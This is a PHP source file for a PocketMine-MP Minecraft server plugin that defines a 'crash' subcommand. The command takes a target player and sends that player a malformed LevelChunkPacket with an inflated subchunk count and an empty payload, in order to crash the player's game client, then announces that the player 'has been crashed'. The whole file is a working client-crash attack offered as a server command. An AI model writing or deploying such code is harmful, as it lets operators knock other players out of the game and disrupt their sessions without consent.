<?php
declare(strict_types=1);

namespace lmao\command\subcmd;

use CortexPE\Commando\args\IntegerArgument;
use CortexPE\Commando\BaseSubCommand;
use CortexPE\Commando\exception\ArgumentOrderException;
use lmao\command\args\PlayerArgument;
use pocketmine\command\CommandSender;
use pocketmine\network\mcpe\protocol\LevelChunkPacket;
use pocketmine\Server;
use pocketmine\world\format\Chunk;

class Crash extends BaseSubCommand{

	/**
	 * @throws ArgumentOrderException
	 */
	protected function prepare() : void{
		$this->setPermission("lmao.crash");
		$this->registerArgument(0, new PlayerArgument());
		$this->registerArgument(1, new IntegerArgument("packet_size", true));
	}

	public function onRun(CommandSender $sender, string $aliasUsed, array $args) : void{
		if (!isset($args["player"])){
			$sender->sendMessage("Please add player name !");
			return;
		}
		$player = Server::getInstance()->getPlayerByPrefix($args["player"]);
		if (is_null($player)){
			$sender->sendMessage("Invalid player name !");
			return;
		}
		$packet_size = $args["packet_size"] ?? 10000;
		//Create a crash packet
		$postion = $player->getPosition();
		$packet = LevelChunkPacket::create($postion->getFloorX() >> Chunk::COORD_BIT_SIZE, $postion->getFloorZ() >> Chunk::COORD_BIT_SIZE, $packet_size, false, null, "");
		$player->getNetworkSession()->sendDataPacket($packet);
		$sender->sendMessage($player->getName() . " has been crashed !");
	}
}